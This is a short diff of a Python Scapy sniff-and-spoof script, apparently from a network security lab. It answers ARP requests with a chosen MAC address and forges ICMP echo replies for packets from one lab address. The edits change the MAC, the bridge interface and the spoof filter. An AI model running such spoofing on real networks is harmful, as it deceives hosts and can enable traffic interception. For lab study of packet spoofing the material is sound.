@@ -11,7 +11,7 @@ def spoof(pkt):
     reply = IP(src=dst, dst=src) / ICMP(type=0, id=id, seq=seq) / load
     send(reply)
 
-myMAC = "02:42:18:db:74:69"
+myMAC = "02:42:6e:b6:b4:95"
 
 def get_arp(pkt): 
     if pkt[ARP].op == 1:
@@ -21,7 +21,7 @@ def get_arp(pkt):
 def print_pkt(pkt):
     if ARP in pkt:
         get_arp(pkt)
-    elif pkt[2].type == 8:
+    elif pkt[IP].src == "10.9.0.5" and pkt[2].type == 8:
         spoof(pkt)
 
-pkt = sniff(iface="br-1a9996b508c9", filter="icmp or arp", prn=print_pkt)
+pkt = sniff(iface="br-c8803e11bda4", filter="icmp or arp", prn=print_pkt)
